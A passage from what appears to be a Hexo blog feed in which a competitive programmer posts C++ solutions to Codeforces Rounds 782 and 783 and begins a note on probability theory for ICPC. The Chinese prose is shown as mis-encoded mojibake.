class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">1</span>]+<span class="number">1</span>&gt;m)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    </span><br><span class="line">    a[<span class="number">0</span>]=a[n];</span><br><span class="line">    <span class="keyword">int</span> ans=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">max</span>(a[i],a[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans&lt;=m)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Make-it-Increasing"><a href="#C-Make-it-Increasing" class="headerlink" title="C. Make it Increasing"></a>C. Make it Increasing</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®šä¸€ä¸ªåˆå§‹å€¼å…¨ä¸º0çš„æ•°ç»„ï¼Œæ¯ä¸ªä½ç½®å¯ä»¥å›ºå®šåŠ æˆ–å‡ä¸€å®šçš„å€¼ï¼Œè¦æ±‚åºåˆ—ä¸¥æ ¼é€’å¢ï¼Œæ±‚æœ€å°‘æ“ä½œæ¬¡æ•°ã€‚å¯¹äºè¿™ä¸ªé—®é¢˜åªéœ€è¦æŠ“ä½ä¸€ä¸ªé‡ç‚¹ï¼šé‚£å°±æ˜¯è°ä¸º0ï¼Œæ ¹æ®ç»™å®šçš„ $n&lt;5000$ åŸºæœ¬å¯ä»¥åˆ¤æ–­å‡ºæ¥è¿™ä¸ªè¦ $O(n^2)$ çš„ç®—æ³•ã€‚æˆ‘ä»¬åªéœ€è¦å¾ªç¯æŠŠä¸€ä¸ªæ•°å¼ºåˆ¶è®¾ç½®ä¸º0ï¼Œç„¶å0å¾€å·¦è¾¹é€’å‡ï¼Œå¾€å³è¾¹é€’å¢ï¼Œè¿™é‡Œæˆ‘ä¹Ÿå¯ä»¥å¾€å·¦è¾¹é€’å¢ï¼Œå› ä¸ºå‡å»å’ŒåŠ ä¸Šå·®ä¸å¤šçš„å˜›ï¼Œæˆ‘åŠ ä¸Šè®©å®ƒé€’å¢å’Œå‡å»è®©å®ƒé€’å‡æ˜¯å·®ä¸å¤šçš„ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0x7fffffffffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//zero</span></span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(b));</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j+<span class="number">1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j<span class="number">-1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        res=<span class="built_in">min</span>(res,ans);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶ä¹Ÿæœ‰ç‚¹æ²¡æ³¨æ„åˆ°å°±æ˜¯æ•°å€¼å¯èƒ½å¾ˆå¤§ï¼Œå¤§åˆ°è¶…è¿‡intï¼Œå½“æ—¶åˆå€¼æˆ‘åªç»™äº†0x7fffffffå°±waäº†ä¸€å‘ã€‚</p><p>è¿™åœºæ¯”èµ›å¤±è¯¯äº†å¾ˆå¤šå§ï¼Œä¸è¿‡æœ€åè¿˜å¾—æ„Ÿè°¢å¤§è‡ªç„¶çš„é¦ˆèµ ï¼Œå†™äº†ä¸€ä¸ªæ˜æ˜¾æœ‰é—®é¢˜çš„ç¨‹åºè®©æˆ‘hackäº†ï¼Œæ²¡è‡³äºè®©æˆ‘æ‰å¤ªå¤šåˆ†ã€‚</p><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/4.png" alt="4"></p><p>ç»§ç»­åŠ æ²¹å§ï¼Œä¸Šåˆ†ä¹‹è·¯è¿˜å¾ˆæ¼«é•¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> æ€ç»´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¦‚ç‡è®ºåœ¨icpcçš„åº”ç”¨</title>
      <link href="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>æ˜†æ˜æ‰“é“ä¹‹åï¼Œç—›å®šæ€ç—›ï¼Œæ¥é‡ä¿®æ¦‚ç‡è®ºäº†ã€‚</p><span id="more"></span><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="æ ·æœ¬ç©ºé—´ã€äº‹ä»¶å’Œæ¦‚ç‡"><a href="#æ ·æœ¬ç©ºé—´ã€äº‹ä»¶å’Œæ¦‚ç‡" class="headerlink" title="æ ·æœ¬ç©ºé—´ã€äº‹ä»¶å’Œæ¦‚ç‡"></a>æ ·æœ¬ç©ºé—´ã€äº‹ä»¶å’Œæ¦‚ç‡</h2><p><strong>æ ·æœ¬ç©ºé—´</strong> S æ˜¯ä¸€ä¸ªé›†åˆï¼Œå®ƒçš„å…ƒç´ ç§°ä¸º<strong>åŸºæœ¬äº‹ä»¶</strong>ã€‚æ ·æœ¬ç©ºé—´çš„ä¸€ä¸ªå­é›†è¢«ç§°ä¸ºäº‹ä»¶ï¼Œ æ ¹æ®å®šä¹‰ï¼Œæ‰€æœ‰åŸºæœ¬äº‹ä»¶<strong>äº’æ–¥</strong>ã€‚</p><p><strong>äº’æ–¥äº‹ä»¶</strong>ï¼šè‹¥äº‹ä»¶ A å‘ç”Ÿ<strong>ä¸€å®š</strong>èƒ½æ¨å¯¼å‡º B ä¸å‘ç”Ÿï¼ŒB å‘ç”Ÿ<strong>ä¸€å®š</strong>èƒ½æ¨å¯¼å‡ºAä¸å‘ç”Ÿï¼Œåˆ™ç§° Aï¼ŒB äº’æ–¥ï¼Œä¸éš¾å¾—å‡ºï¼Œä¸¤ä¸ªäº‹ä»¶åŒæ—¶å‘ç”Ÿçš„æ¦‚ç‡ä¸º 0ï¼Œè‡³å°‘å‘ç”Ÿå…¶ä¸­ä¸€ä¸ªäº‹ä»¶çš„æ¦‚ç‡ä¸ºä¸¤è€…æ¦‚ç‡ä¹‹å’Œï¼ˆæ¦‚ç‡å…¬ç†3ï¼‰ã€‚è¿™ä¸ªç†è®ºå¯ä»¥æ¨å¯¼åˆ° n ä¸ªäº‹ä»¶ï¼Œè‹¥æœ‰ n ä¸ª<strong>ä¸¤ä¸¤äº’æ–¥</strong>äº‹ä»¶ $a_1,a_2â€¦a_n$ï¼Œåˆ™ä»»æ„ä¸¤ä¸ªäº‹ä»¶åŒæ—¶å‘ç”Ÿçš„æ¦‚ç‡ä¸º 0ï¼Œä»»æ„å‘ç”Ÿä¸€ä¸ªäº‹ä»¶çš„æ¦‚ç‡å°±ä¸º $\sum _{i=1}^n a_i$ ã€‚</p><p><strong>æ¦‚ç‡å…¬ç†</strong>ï¼š</p><ol><li>å¯¹äºä»»æ„äº‹ä»¶ Aï¼Œäº‹ä»¶å‘ç”Ÿçš„æ¦‚ç‡æ»¡è¶³ $0\le P{A}\le1$</li><li>å¯¹äºæ ·æœ¬ç©ºé—´ Sï¼Œæœ‰$P{S}=1$</li><li>å¯¹äºä¸¤ä¸ªäº’æ–¥äº‹ä»¶ Aï¼ŒBï¼Œæœ‰ $P{AâˆªB}=P{A}+P{B}$</li></ol><h2 id="éšæœºå˜é‡"><a href="#éšæœºå˜é‡" class="headerlink" title="éšæœºå˜é‡"></a>éšæœºå˜é‡</h2><p>å¦‚æœå¯¹æ ·æœ¬ç©ºé—´ S ä¸­çš„ä»»æ„äº‹ä»¶ eï¼Œéƒ½æœ‰<strong>å”¯ä¸€</strong>çš„å®æ•° <strong>X(e)</strong> ä¸ä¹‹å¯¹åº”ï¼Œåˆ™ç§° <strong>X=X(e)</strong> ä¸ºæ · æœ¬ç©ºé—´ S ä¸Šçš„éšæœºå˜é‡ã€‚è¿™ä¸ªéšæœºå˜é‡æ€ä¹ˆç†è§£å‘¢ï¼Œé¦–å…ˆçœ‹ä¸‹é¢è¿™å¼ å›¾ï¼š</p><p><img src="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/1.png" alt="1"></p><p>è¿˜ä¸èƒ½ç†è§£çš„è¯ï¼Œå°±ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœæ·ä¸€ä¸ªéª°å­ï¼Œé‚£ä¹ˆå®ƒçš„æ ·æœ¬ç©ºé—´ä¸º **{1,2,3,4,5,6}**ï¼ŒæŠŠå®ƒä¸€æ¬¡æ·éª°å­å‡ºçš„ç‚¹æ•°ä½œä¸ºä¸€ä¸ªéšæœºå˜é‡çš„è¯ï¼Œé‚£ä¹ˆå¾ˆ    å®¹æ˜“å¾—åˆ°æ˜ å°„ X å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ $X(e)=e$ï¼Œæˆ–è€…è¯´ï¼Œéšæœºå˜é‡ä¸ºæ ·æœ¬ç‚¹ e çš„å‡½æ•°ï¼Œä»¥æ ·æœ¬ç‚¹ä¸ºè‡ªå˜é‡ï¼Œç¡®å®šä¸€ä¸ªå¯¹åº”å…³ç³»å¾—åˆ°çš„åº”å˜é‡å°±æ˜¯ä¸€ä¸ªéšæœºå˜é‡ã€‚</p><p>å…¶ä¸­<strong>ç¦»æ•£å‹éšæœºå˜é‡</strong>å’Œ<strong>è¿ç»­å‹éšæœºå˜é‡</strong>æ¯”è¾ƒå¸¸è§ã€‚</p><h3 id="ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"><a href="#ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ" class="headerlink" title="ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"></a>ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ</h3><p>ç¦»æ•£å‹éšæœºå˜é‡å–å€¼èŒƒå›´ä¸º<strong>æœ‰é™å¯æ•°</strong>æˆ–è€…<strong>æ— é™å¯æ•°</strong>ï¼Œæˆ–è€…è¯´å–å€¼èŒƒå›´ä¸åœ¨å®æ•°èŒƒå›´å†…è¿ç»­ã€‚è®¾ç¦»æ•£å‹éšæœºå˜é‡ X çš„å–å€¼ä¸º $\text{x}_i$ æ—¶çš„æ¦‚ç‡ä¸º $p_i(i=1,2â€¦)$ï¼Œåˆ™ç§° X çš„æ‰€æœ‰å–å€¼åŠå…¶æ¦‚ç‡ä¸ºéšæœºå˜é‡ X çš„æ¦‚ç‡åˆ†å¸ƒã€‚ç¦»æ•£å‹å˜é‡å¸¸è§çš„åˆ†å¸ƒæœ‰ä¸¤ç‚¹åˆ†å¸ƒï¼ŒäºŒé¡¹åˆ†å¸ƒï¼Œå‡ ä½•åˆ†å¸ƒï¼Œè¶…å‡ ä½•åˆ†å¸ƒï¼Œæ³Šæ¾åˆ†å¸ƒã€‚</p><h3 id="è¿ç»­æ€§éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"><a href="#è¿ç»­æ€§éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ" class="headerlink" title="è¿ç»­æ€§éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"></a>è¿ç»­æ€§éšæœºå˜é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ</h3><p>å¦‚æœ X æ˜¯åœ¨å®æ•°åŸŸæˆ–åŒºé—´ä¸Š<strong>å–è¿ç»­å€¼</strong>çš„éšæœºå˜é‡ï¼Œè®¾ X çš„æ¦‚ç‡åˆ†å¸ƒå‡½æ•°ä¸º $F(x)=P{X\le x}$ï¼Œè‹¥å­˜åœ¨éè´Ÿå¯ç§¯å‡½æ•° $f(x)$ï¼Œä½¿å¾—å¯¹ä»»æ„çš„ xï¼Œæœ‰ $F(x)=\int _{-âˆ}^{x}f(t)dt$ï¼Œåˆ™ç§° X ä¸ºè¿ç»­éšæœºå˜é‡ï¼Œç§° $f(x)$ ä¸º X çš„<strong>æ¦‚ç‡å¯†åº¦å‡½æ•°</strong>ã€‚å¸¸è§çš„è¿ç»­æ€§éšæœºå˜é‡åˆ†å¸ƒæœ‰å‡åŒ€åˆ†å¸ƒï¼Œæ­£æ€åˆ†å¸ƒï¼ŒæŒ‡æ•°åˆ†å¸ƒã€‚</p><p>æ¦‚ç‡å¯†åº¦å‡½æ•°çš„å‡ ä½•æ„ä¹‰ï¼šéšæœºå˜é‡çš„å–å€¼è½åœ¨æŸä¸ªåŒºåŸŸä¹‹å†…çš„æ¦‚ç‡ä¸ºæ¦‚ç‡å¯†åº¦å‡½æ•°åœ¨è¿™ä¸ªåŒºåŸŸä¸Šçš„ç§¯åˆ†ã€‚å½“æ¦‚ç‡å¯†åº¦å‡½æ•°å­˜åœ¨çš„æ—¶å€™ï¼Œç´¯ç§¯åˆ†å¸ƒå‡½æ•°æ˜¯æ¦‚ç‡å¯†åº¦å‡½æ•°çš„ç§¯åˆ†ï¼Œå¯¹æ¦‚ç‡å¯†åº¦å‡½æ•°ä½œå‚…é‡Œå¶å˜æ¢å¯å¾—ç‰¹å¾å‡½æ•°ã€‚</p><p>åœ¨æ•°å­¦ä¸­ï¼Œè¿ç»­å‹éšæœºå˜é‡çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼ˆåœ¨ä¸è‡³äºæ··æ·†æ—¶å¯ä»¥ç®€ç§°ä¸ºå¯†åº¦å‡½æ•°ï¼‰æ˜¯ä¸€ä¸ªæè¿°è¿™ä¸ªéšæœºå˜é‡çš„è¾“å‡ºå€¼ï¼Œåœ¨æŸä¸ªç¡®å®šçš„å–å€¼ç‚¹é™„è¿‘çš„å¯èƒ½æ€§çš„å‡½æ•°ã€‚è€Œéšæœºå˜é‡çš„å–å€¼è½åœ¨æŸä¸ªåŒºåŸŸä¹‹å†…çš„æ¦‚ç‡åˆ™ä¸ºæ¦‚ç‡å¯†åº¦å‡½æ•°åœ¨è¿™ä¸ªåŒºåŸŸä¸Šçš„ç§¯åˆ†ã€‚å½“æ¦‚ç‡å¯†åº¦å‡½æ•°å­˜åœ¨çš„æ—¶å€™ï¼Œç´¯ç§¯åˆ†å¸ƒå‡½æ•°æ˜¯æ¦‚ç‡å¯†åº¦å‡½æ•°çš„ç§¯åˆ†ã€‚</p><h4 id="è¿ç»­å‹éšæœºå‘é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"><a href="#è¿ç»­å‹éšæœºå‘é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ" class="headerlink" title="è¿ç»­å‹éšæœºå‘é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ"></a>è¿ç»­å‹éšæœºå‘é‡åŠå…¶æ¦‚ç‡åˆ†å¸ƒ</h4><p>å¾…æ›´æ–°</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ•°å­¦ </category>
          
          <category> æ¦‚ç‡è®º </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 782(Div.2)è§£æ</title>
      <link href="/2022/04/18/Codeforces%20Round%20782(Div.2)/"/>
      <url>/2022/04/18/Codeforces%20Round%20782(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ï¼Œç¬¬ä¸€æ¬¡CFæ‰“å‡ºæ¥Dé¢˜ï¼Œå˜å˜ä¸Š132åˆ†ï¼Œç›®å‰1584åˆ†ï¼Œç´«åæŒ‡æ—¥å¯å¾…ã€‚</p><span id="more"></span><h2 id="A-Red-Versus-Blue"><a href="#A-Red-Versus-Blue" class="headerlink" title="A.Red Versus Blue"></a>A.Red Versus Blue</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>çŸ¥é“åŒæ–¹èµ¢çƒåœºæ¬¡ï¼Œè¦æ±‚æ„é€ ä¸€ä¸ªè¾“èµ¢åºåˆ—ä½¿å¾—æ€»æ¯”èµ›ä¸­æœ€å¤§è¿èµ¢åœºæ•°æœ€å°ï¼Œå³ç»™å®šä¸¤ç§å­—ç¬¦åŠä¸ªæ•°ï¼Œè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ä½¿å¾—ç”±ç›¸åŒå­—ç¬¦æ„æˆçš„å­ä¸²æœ€çŸ­ã€‚</p><p>é¦–å…ˆé¢˜ç›®ç»™å®šäº†Bçš„æ•°ç›®ä¸¥æ ¼å°äºRï¼Œé‚£ä¹ˆæœ€ä¼˜çš„æƒ…å†µä¸€å®šæ˜¯ä¸€è¾“ä¸€èµ¢ï¼Œè€ƒè™‘åœ¨ b ä¸ª B ä¸­æ’å…¥Rï¼Œå®¹æ˜“å¾—åˆ°æ€»å…±æœ‰ b+1 ä¸ªå¯ä»¥æ’å…¥çš„ä½ç½®ã€‚è‹¥ r å¯ä»¥æ•´é™¤ b+1ï¼Œåˆ™å¯ä»¥å¾—å‡ºç­”æ¡ˆä¸º r/(b+1)ï¼Œè‹¥å¦ï¼Œåˆ™å¾—åˆ° r/(b+1)+1ã€‚</p><p>æˆ‘ä»¬å…ˆåœ¨b+1ä¸ªä½ç½®ä¸­æ¯ä¸ªæ”¾ä¸Š r/(b+1) ä¸ª Rï¼Œå‰©ä¸‹r%(b+1)ä¸ªRåˆ™éšä¾¿ç»™ï¼Œåªè¦ä¸è¦ä¸€ä¸ªä½ç½®ç»™ä¸¤æ¬¡å°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,r,b;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> k=r/(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> res=r%(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">            res--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        res--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" 